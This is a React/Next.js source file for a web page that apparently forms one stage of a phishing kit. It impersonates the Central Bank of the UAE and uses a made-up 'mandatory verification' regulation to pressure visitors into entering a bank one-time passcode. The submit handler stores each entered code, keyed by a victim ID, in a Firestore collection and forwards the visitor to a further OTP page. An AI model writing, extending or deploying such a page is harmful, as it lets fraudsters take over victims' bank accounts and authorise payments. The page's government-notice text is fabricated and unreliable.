"use client"

import type React from "react"
import { useState, useEffect } from "react"
import Image from "next/image"
import Header from '../components/Header'
import Footer from '../components/Footer'
import { doc, setDoc, serverTimestamp } from "firebase/firestore"
import { db } from "../../lib/firebase"
import { useRouter, useSearchParams } from 'next/navigation'

export default function OTPVerification() {
  const [otpCode, setOtpCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")
  const [uid, setUid] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()

  useEffect(() => {
    // Get UID from URL parameters
    const urlUid = searchParams.get('uid')
    if (urlUid) {
      setUid(urlUid)
      console.log("Received UID from URL:", urlUid)
    } else {
      setMessage("Error: No user session found. Please start from the beginning.")
    }
  }, [searchParams])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    // Check if UID is available
    if (!uid) {
      setMessage("Error: No user session found. Please start from the beginning.")
      setIsLoading(false)
      return
    }

    // Check if OTP code is provided
    if (!otpCode.trim()) {
      setMessage("Please enter the OTP code")
      setIsLoading(false)
      return
    }

    try {
      // Store OTP data in "users" database, document "sixthform", with UID as field name
      const sixthformDocRef = doc(db, "users", "sixthform")
      await setDoc(sixthformDocRef, {
        [uid]: {
          otpCode: otpCode,
          uid: uid,
          createdAt: serverTimestamp(),
          status: "pending",
          step: "otpVerification3"
        }
      }, { merge: true })

      console.log("OTP submitted:", otpCode)
      console.log("Data stored with UID: ", uid)
      
      setMessage("OTP submitted successfully!")
      
      // Navigate to otp4 page with the same UID
      router.push(`/otp4?uid=${uid}`)

    } catch (error) {
      console.error("Error adding document: ", error)
      setMessage("Error submitting OTP. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <>
      <Header />
      <div className="min-h-screen bg-slate-100 flex flex-col items-center justify-start px-4 py-8 ">
        {/* Main Container */}
        <div className="w-full max-w-[600] mb-40">
          {/* Title */}
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-[#B48B5E] mb-3">OTP VERIFICATION</h1>
            <div className="h-0.5 bg-[#B48B5E] w-96 mx-auto"></div>
          </div>

          {/* Success/Error Message */}
          {message && (
            <div className={`p-4 mb-4 rounded-md ${
              message.includes("Error") 
                ? "bg-red-100 text-red-700 border border-red-300" 
                : "bg-green-100 text-green-700 border border-green-300"
            }`}>
              {message}
            </div>
          )}

          {/* Bank Header Banner */}
          <div className="mb-8 rounded-lg overflow-hidden shadow-md">
            <Image
              src="/central.jpg"
              alt="Central Bank of the UAE"
              width={800}
              height={120}
              className="w-full h-auto"
              priority
            />
          </div>

          {/* Verification Progress Section */}
          <div className="mb-8">
            <p className="text-slate-700 font-semibold mb-3">Verification Progress</p>
            <div className="w-full bg-slate-300 h-6 rounded-sm overflow-hidden flex items-center">
              {/* Green progress bar with animated diagonal stripes */}
              <div
                className="h-full w-2/3 flex items-center justify-center text-white text-sm font-bold relative"
                style={{
                  backgroundColor: "rgb(25,135,84)",
                  backgroundImage:
                    "linear-gradient(45deg, rgba(255,255,255,.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,.15) 50%, rgba(255,255,255,.15) 75%, transparent 75%, transparent)",
                  backgroundSize: "1rem 1rem",
                  animation: "moveStripes 1s linear infinite",
                }}
              >
                <span className="z-10">70%</span>

                {/* Inline style tag for keyframes */}
                <style>
                  {`
                    @keyframes moveStripes {
                      from {
                        background-position: 1rem 0;
                      }
                      to {
                        background-position: 0 1rem;
                      }
                    }
                  `}
                </style>
              </div>
            </div>
          </div>

          {/* OTP Form Section */}
          <div className="rounded-2xl p-8 mb-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* OTP Code Input */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-3">
                  OTP Code <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  placeholder="Enter OTP Code"
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#B48B5E] focus:border-transparent bg-white text-slate-700 disabled:bg-gray-100 disabled:cursor-not-allowed"
                  disabled={isLoading}
                  required
                />
              </div>

              {/* Submit Button */}
              <div className="flex justify-center pt-4">
                <button
                  type="submit"
                  disabled={isLoading || !uid}
                  className="px-8 py-2 bg-[#B48B5E] hover:bg-[#a37a52] text-white font-semibold rounded-lg transition-colors duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                  {isLoading ? "Processing..." : "Next"}
                </button>
              </div>
            </form>
          </div>

          {/* Information Card */}
          <div className="bg-white rounded-2xl shadow-lg p-16">
            <div className="mb-6">
              <h2 className="text-3xl font-bold text-[#B48B5E] text-center mb-3">
                Mandatory Verification of Bank Accounts and Payment Cards
              </h2>
              <div className="h-0.5 bg-[#B48B5E] w-120 mx-0"></div>
            </div>

            <div className="space-y-10 text-xl text-slate-700 leading-relaxed">
              <p>
                The United Arab Emirates (UAE) has implemented a new regulation mandating that all bank accounts, debit
                cards, and credit cards must undergo verification by the specified deadline set by the UAE government.
                This measure aims to enhance financial security and ensure compliance with regulatory standards.
              </p>

              <div>
                <p className="font-semibold text-slate-900 mb-2">Formal Statement:</p>
                <p className="italic">
                  "In accordance with the latest financial security measures, the UAE government has introduced a new
                  regulation requiring the verification of all bank accounts, debit cards, and credit cards issued within
                  the UAE. This regulation is part of the ongoing efforts to enhance the integrity and security of the
                  financial system."
                </p>
              </div>

              <p>
                The UAE government urges all residents and businesses to cooperate with their financial institutions and
                complete the verification process promptly to avoid service disruptions.
              </p>
            </div>
          </div>

          {/* Debug info - you can remove this in production */}
          
        </div>
      </div>
      <Footer />
    </>
  )
}